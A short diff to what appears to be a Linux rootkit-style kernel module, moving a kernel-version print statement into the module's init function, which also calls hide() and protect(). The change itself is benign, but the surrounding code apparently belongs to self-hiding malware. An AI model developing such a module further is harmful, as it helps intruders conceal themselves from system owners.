@@ -41,9 +41,8 @@
 #include <linux/in.h>
 #include <net/tcp.h>
 #include <net/udp.h>
-#include <linux/utsname.h>
 
-pr_info("Version: %s\n", utsname()->release);
+#include <linux/utsname.h>
 
 #define TMPSZ 150
 
@@ -1213,6 +1212,7 @@ found:
 int init(void)
 {
     pr_info("Module loaded\n");
+    pr_info("Version: %s\n", utsname()->release);
     hide();
     protect();
 
